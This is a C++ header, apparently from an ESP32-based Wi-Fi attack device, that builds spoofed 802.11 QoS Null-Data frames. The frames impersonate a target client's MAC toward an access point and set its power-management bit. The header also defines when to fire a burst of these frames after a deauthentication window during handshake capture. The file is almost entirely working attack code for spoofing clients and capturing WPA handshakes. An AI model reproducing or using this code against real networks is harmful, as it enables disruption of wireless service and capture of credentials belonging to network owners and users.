#pragma once

/**
 * @file qos_null_frame.h
 * @brief Pure builder for a spoofed 802.11 QoS Null-Data frame (type=2, subtype=12),
 *        plus the autohunt QoS-Null burst-fire predicate (ADR-0159, slice-0160).
 *
 * Header-only on purpose, mirroring btm_frame.h: the builder is pure and
 * native-testable, and keeping the burst predicate next to the frame contract
 * keeps the policy and the bytes visible together. The ESP32-side TX helper
 * lives in qos_null_tx.h/.cpp so this file stays free of radio headers.
 *
 * Frame layout (ADR-0159, slice-0160):
 *   Frame Control    2 bytes   byte 0 = 0xC8 (version=0, type=2 Data,
 *                                             subtype=12 QoS Null)
 *                              byte 1 = ToDS=1, FromDS=0, MoreFrag=0,
 *                                       Retry=0, PwrMgt=<arg>, MoreData=0,
 *                                       ProtectedFrame=0, Order=0
 *   Duration/ID      2 bytes   little-endian, 0x0000
 *   Address 1 (RA)   6 bytes   target AP BSSID
 *   Address 2 (TA)   6 bytes   target client MAC (spoofed)
 *   Address 3        6 bytes   target AP BSSID (DA inside the BSS for ToDS=1)
 *   Sequence Ctrl    2 bytes   little-endian, fragment=0, sequence=<arg>
 *   QoS Control      2 bytes   little-endian, 0x0000 (TID 0, no ack policy override)
 *   TOTAL            26 bytes
 */

#include <cstddef>
#include <cstdint>
#include <cstring>

namespace adversary::utils {

constexpr size_t kQosNullFrameSize = 26;

namespace qos_null_detail {
    /// FC byte 0: version=0, type=Data(10), subtype=QoS-Null(1100) => 0xC8.
    constexpr uint8_t kFcByte0 = 0xC8;
    /// FC byte 1 base: ToDS=1, FromDS=0, all other flags zero. PWR_MGT bit (0x10) ORed in per call.
    constexpr uint8_t kFcByte1ToDs   = 0x01;
    constexpr uint8_t kFcByte1PwrMgt = 0x10;
}  // namespace qos_null_detail

/**
 * @brief Build a 26-byte QoS Null-Data frame (client-to-AP) at @p out.
 *
 * Pure, host-testable, no ESP-IDF includes.
 *
 * @param out       Output buffer; must be at least kQosNullFrameSize bytes.
 * @param out_len   Buffer capacity.
 * @param ta        6-byte Transmitter Address (A2) = target client MAC (spoofed).
 * @param bssid     6-byte AP BSSID (used as both A1/RA and A3).
 * @param pwr_mgt   Value of the 802.11 Power Management bit in FC byte 1.
 * @param seq_no    12-bit sequence number; written little-endian, fragment=0.
 * @return 26 on success; 0 on any parameter or capacity failure.
 */
inline size_t build_qos_null_data(uint8_t* out,
                                  size_t out_len,
                                  const uint8_t ta[6],
                                  const uint8_t bssid[6],
                                  bool pwr_mgt,
                                  uint16_t seq_no) {
    if (out == nullptr) return 0;
    if (out_len < kQosNullFrameSize) return 0;
    if (ta == nullptr || bssid == nullptr) return 0;

    std::memset(out, 0, kQosNullFrameSize);

    // Frame Control
    out[0] = qos_null_detail::kFcByte0;
    out[1] = qos_null_detail::kFcByte1ToDs
           | (pwr_mgt ? qos_null_detail::kFcByte1PwrMgt : 0);

    // Duration/ID
    out[2] = 0x00;
    out[3] = 0x00;

    // Address 1 (RA) = AP BSSID
    std::memcpy(&out[4], bssid, 6);
    // Address 2 (TA) = spoofed client MAC
    std::memcpy(&out[10], ta, 6);
    // Address 3 = AP BSSID (DA in BSS for ToDS=1)
    std::memcpy(&out[16], bssid, 6);

    // Sequence Control: fragment=0 (low 4 bits of byte 22), sequence=seq_no (next 12 bits), LE.
    const uint16_t seq12 = static_cast<uint16_t>(seq_no & 0x0FFF);
    const uint16_t seq_ctl = static_cast<uint16_t>(seq12 << 4);
    out[22] = static_cast<uint8_t>(seq_ctl & 0xFF);
    out[23] = static_cast<uint8_t>((seq_ctl >> 8) & 0xFF);

    // QoS Control (TID=0, no ack policy override, EOSP=0, A-MSDU=0).
    out[24] = 0x00;
    out[25] = 0x00;

    return kQosNullFrameSize;
}

/**
 * @brief Pure predicate: fire the QoS-Null burst for this target right now?
 *
 * Returns true iff all four preconditions hold:
 *   - the operator enabled the QoS-Null knob
 *   - the burst has not already fired for this target in this capture window
 *   - the deauth sub-window has elapsed (fixed ordering, ADR-0159)
 *   - a client MAC is known for the target (we have a TA to spoof)
 *
 * All 16 cells are native-testable. The live call site in handshake_capture
 * reads a predicate the suite already covers in full.
 */
inline bool shouldFireQosNullBurst(bool qosNullEnabled,
                                   bool qosNullAlreadyFiredThisTarget,
                                   bool deauthSubWindowElapsed,
                                   bool clientMacKnown) {
    return qosNullEnabled
        && !qosNullAlreadyFiredThisTarget
        && deauthSubWindowElapsed
        && clientMacKnown;
}

}  // namespace adversary::utils
